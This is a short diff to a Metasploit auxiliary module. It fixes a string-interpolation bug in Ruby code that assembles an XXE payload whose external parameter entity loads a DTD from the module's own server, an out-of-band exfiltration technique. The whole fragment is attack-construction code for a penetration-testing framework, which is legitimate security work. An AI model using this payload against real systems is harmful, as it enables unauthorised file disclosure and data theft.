@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
     xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
     xml += '['
     xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
-    xml += "    <!ENTITY % #{param_entity_name} SYSTEM '#{get_uri}/Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
+    xml += "    <!ENTITY % #{param_entity_name} SYSTEM '#{get_uri}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
     xml += ']'
     xml += "> <r>&#{ent_eval};</r>"
 
